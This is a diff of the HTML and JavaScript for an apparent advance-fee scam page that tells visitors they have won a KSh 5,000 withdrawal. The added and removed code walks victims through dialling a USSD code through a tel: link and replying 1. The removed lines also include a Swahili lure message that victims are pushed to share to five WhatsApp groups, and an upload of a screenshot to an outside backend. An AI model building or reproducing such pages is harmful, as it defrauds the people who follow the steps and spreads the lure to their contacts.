@@ -3,11 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Congratulations</title>
-    <link href="https://fonts.googleapis.com/css2?family=Patrick+Hand&display=swap" rel="stylesheet">
+<title>Activate Your Reward</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Patrick+Hand&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="style.css">
 </head>
 
+<body>
 
 <div class="container">
 
@@ -17,74 +19,37 @@
 
         <h1>✅ Congratulations!</h1>
 
-        <p>You've qualified for withdrawal</p>
+        <p>You've qualified for withdrawal.</p>
 
         <h2>Your withdrawal request for <strong>KSh 5,000</strong> has been received.</h2>
 
     </div>
 
-    <h2 class="steps-title">📋 COMPLETE THESE STEPS</h2>
-
     <div class="card step">
 
-    <h3>Step 1 of 3: Activate Your Chance</h3>
+        <h3>Step 1 of 3: Activate Your Reward</h3>
 
-    
-        
-    <p>
-    📞 Tap "Dial Code Now" to open your phone dialer.<br><br>
-    ☎️ Tap the call button to start the process.<br><br>
-    1️⃣ When the USSD menu appears, reply with <strong>1</strong> to continue.<br><br>
-    ✅ After completion, return here and tap "Continue".
-</p>
+        <p>
+            <strong>1.</strong> Tap <strong>Dial Code Now</strong>.<br><br>
 
-    <h2>*811*9372604#</h2>
+            <strong>2.</strong> Reply with <strong>1</strong> on the USSD menu.<br><br>
 
-    <button onclick="dialNow()">
-        📞 Dial Code Now
-    </button>
-<p id="dialStatus" style="margin-top:15px;color:#555;">
-    After completing the USSD step, return here and tap continue.
-</p>
+            <strong>3.</strong> Return here and tap <strong>I've Completed This Step</strong>.
+        </p>
 
-<button id="continueBtn" onclick="completeDial()" style="margin-top:15px;">
-    Continue
-</button>
-    
+        <h2>*811*9372604#</h2>
 
-</div>
+        <button onclick="dialNow()">
+            📞 Dial Code Now
+        </button>
 
-    </div>
+        <p id="dialStatus" style="margin-top:15px;color:#555;">
+            Complete the USSD process, then continue.
+        </p>
 
-    <div class="card step">
-
-    <h3>Step 2 of 3: Share With Friends</h3>
-
-    <p>
-        Share Pesa Link with 5 WhatsApp groups to continue.
-    </p>
-
-    <p id="shareCount">
-        Shares completed: 0/5
-    </p>
-
-    <button id="shareBtn" onclick="shareWhatsApp()" disabled>
-        🔗 Share Now
-    </button>
-
-</div>
-
-    <div class="card step">
-
-        <h3>Step 3 of 3: Upload Confirmation Screenshot</h3>
-<p>
-Upload the screenshot you received from Skiza after completing the process.
-</p>
-       <input type="file" id="screenshot" accept="image/*">
-
-<button id="uploadBtn" onclick="uploadScreenshot()">
-    📤 Upload Screenshot
-</button>
+        <button id="continueBtn" onclick="completeDial()" style="margin-top:15px;">
+            ✅ I've Completed This Step
+        </button>
 
     </div>
 
@@ -92,95 +57,23 @@ Upload the screenshot you received from Skiza after completing the process.
 
 <script>
 
-let shares = Number(localStorage.getItem("shares")) || 0;
-document.getElementById("shareCount").innerHTML =
-"Shares completed: " + shares + "/5";
-    if (shares >= 5) {
-
-    document.getElementById("uploadBtn").disabled = false;
-
-    localStorage.setItem("sharingCompleted", "true");
-
-    }
-function dialNow() {
+function dialNow(){
 
     document.getElementById("dialStatus").innerHTML =
-    "Dialing started. Complete the USSD instructions, reply with 1, then return here to continue.";
+    "Complete the USSD process and reply with 1.";
 
-    window.location.href = "tel:*811*9372604%23";
-
-}
-function completeDial() {
-
-    localStorage.setItem("dialCompleted", "true");
-
-    document.getElementById("shareBtn").disabled = false;
-
-    document.getElementById("dialStatus").innerHTML =
-    "Step completed. You can now continue to Share.";
-
-    document.getElementById("continueBtn").style.display = "none";
+    window.location.href="tel:*811*9372604%23";
 
 }
 
-function shareWhatsApp() {
+function completeDial(){
 
-    let websiteLink = "https://pesacash-52so.onrender.com";
+    localStorage.setItem("dialCompleted","true");
 
-    let message = `
-Nimepata bahati leo na kujishindia KSh 5,000.
-
-Jaribu nafasi yako kupitia Pesa Link upate hadi KSh 5,000.
-
-Fuata hatua rahisi kuanza hapa:
-${websiteLink}
-`;
-
-    let url = "https://wa.me/?text=" + encodeURIComponent(message);
-
-    window.open(url, "_blank");
-
-    shares++;
-
-    localStorage.setItem("shares", shares);
-
-    document.getElementById("shareCount").innerHTML =
-    "Shares completed: " + shares + "/5";
+    window.location.href="share.html";
 
 }
-async function uploadScreenshot() {
 
-    const file = document.getElementById("screenshot").files[0];
-
-    if (!file) {
-        alert("Please select a screenshot first.");
-        return;
-    }
-
-    const formData = new FormData();
-    formData.append("screenshot", file);
-
-    try {
-
-        const response = await fetch("https://skiza-backend.onrender.com/upload", {
-            method: "POST",
-            body: formData
-        });
-
-        const data = await response.json();
-
-        if (data.success) {
-            alert("✅ Screenshot uploaded successfully!");
-        } else {
-            alert(data.message);
-        }
-
-    } catch (error) {
-        alert("❌ Upload failed.");
-        console.error(error);
-    }
-
-}
 </script>
 
 </body>
